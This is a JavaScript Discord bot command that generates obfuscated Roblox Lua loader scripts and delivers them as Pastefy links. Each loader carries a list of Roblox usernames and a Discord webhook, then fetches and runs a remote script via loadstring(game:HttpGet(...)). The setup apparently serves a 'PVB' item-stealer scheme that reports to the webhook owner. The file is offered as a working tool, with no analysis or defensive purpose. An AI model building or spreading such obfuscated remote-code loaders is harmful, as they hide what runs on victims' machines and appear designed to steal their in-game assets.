import { SlashCommandBuilder } from 'discord.js';
import axios from 'axios';
import { obfuscateScript } from '../core/utils/prometheus.js';

function formatNumber(value, fallback) {
  const num = Number.isFinite(value) ? value : fallback;
  return Number(num).toLocaleString('en-US');
}

function buildLoaderScript({ usernames, webhook, mps, dps }) {
  const quotedNames = usernames.map((name) => `"${name}"`).join(', ');
  return `luaUsernames = {${quotedNames}}
Webhook = "${webhook}"

-- Priority
MoneyPerSecond = ${mps} -- DEFAULT: 300000/s
DMGPerSecond = ${dps} -- DEFAULT: 300000/s

loadstring(game:HttpGet("https://codeberg.org/aevithegreat/NoriScripts/raw/branch/main/PVB.lua"))()`;
}

async function uploadToPastefy(content) {
  console.log('[Pastefy] Uploading obfuscated script');
  const response = await axios.post('https://pastefy.app/api/v2/paste', {
    content,
    title: 'PVB Loader',
    description: 'Generated by Nori Script#4550'
  }, {
    headers: {
      'Content-Type': 'application/json'
    }
  });
  if (!response?.data?.id) {
    throw new Error('Pastefy response missing ID');
  }
  console.log('[Pastefy] Upload successful');
  return `https://pastefy.app/${response.data.id}/raw`;
}

function sanitizeUsernames(input) {
  return input
    .split(',')
    .map((name) => name.trim())
    .filter((name) => name.length > 0);
}

export const data = new SlashCommandBuilder()
  .setName('gen')
  .setDescription('Generator commands for Nori Script')
  .addSubcommand((subcommand) =>
    subcommand
      .setName('pvb')
      .setDescription('Generate an obfuscated PVB loader script')
      .addStringOption((option) =>
        option
          .setName('usernames')
          .setDescription('Comma-separated Roblox usernames (User1,User2)')
          .setRequired(true)
      )
      .addStringOption((option) =>
        option
          .setName('webhook')
          .setDescription('Discord webhook URL for notifications')
          .setRequired(true)
      )
      .addIntegerOption((option) =>
        option
          .setName('mps')
          .setDescription('Money per second value')
          .setRequired(false)
      )
      .addIntegerOption((option) =>
        option
          .setName('dps')
          .setDescription('Damage per second value')
          .setRequired(false)
      )
  );

export async function execute(interaction) {
  console.log('[Command] /gen pvb invoked');
  if (interaction.options.getSubcommand() !== 'pvb') {
    await interaction.reply({ content: 'Unknown subcommand.', ephemeral: true });
    return;
  }

  await interaction.deferReply({ ephemeral: false });
  console.log('[Command] Interaction deferred');

  const usernamesInput = interaction.options.getString('usernames', true);
  const webhookUrl = interaction.options.getString('webhook', true);
  const mpsOption = interaction.options.getInteger('mps') ?? 500000;
  const dpsOption = interaction.options.getInteger('dps') ?? 500000;

  if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
    console.warn('[Command] Invalid webhook URL');
    await interaction.editReply({ content: 'Invalid webhook URL. Please provide a Discord webhook (https://discord.com/api/webhooks/...).' });
    return;
  }

  const usernames = sanitizeUsernames(usernamesInput);
  if (usernames.length === 0) {
    console.warn('[Command] No valid usernames provided');
    await interaction.editReply({ content: 'Please provide at least one valid Roblox username.' });
    return;
  }

  try {
    console.log('[Command] Building loader script');
    const loaderScript = buildLoaderScript({ usernames, webhook: webhookUrl, mps: mpsOption, dps: dpsOption });

    console.log('[Command] Obfuscating script');
    const obfuscatedScript = obfuscateScript(loaderScript);

    console.log('[Command] Uploading to Pastefy');
    const pasteLink = await uploadToPastefy(obfuscatedScript);

    let dmDelivered = true;
    try {
      await interaction.user.send({
        content: `Here is your obfuscated PVB loader script: ${pasteLink}`
      });
      console.log('[Command] DM sent successfully');
    } catch (dmError) {
      dmDelivered = false;
      console.warn('[Command] Failed to send DM:', dmError);
    }

    const formattedMps = formatNumber(mpsOption, 500000);
    const formattedDps = formatNumber(dpsOption, 500000);

    if (dmDelivered) {
      await interaction.editReply({
        content: `PVB loader generated! Link sent to DMs. MPS: ${formattedMps}, DPS: ${formattedDps}`
      });
    } else {
      await interaction.editReply({
        content: `PVB loader generated! Couldn't DM you, here's the link: ${pasteLink}\nMPS: ${formattedMps}, DPS: ${formattedDps}`
      });
    }
  } catch (error) {
    console.error('[Command] Failed to generate loader:', error);
    const responseContent = 'Something went wrong while generating the loader. Please try again later.';
    if (interaction.deferred || interaction.replied) {
      await interaction.editReply({ content: responseContent });
    } else {
      await interaction.reply({ content: responseContent, ephemeral: true });
    }
  }
}
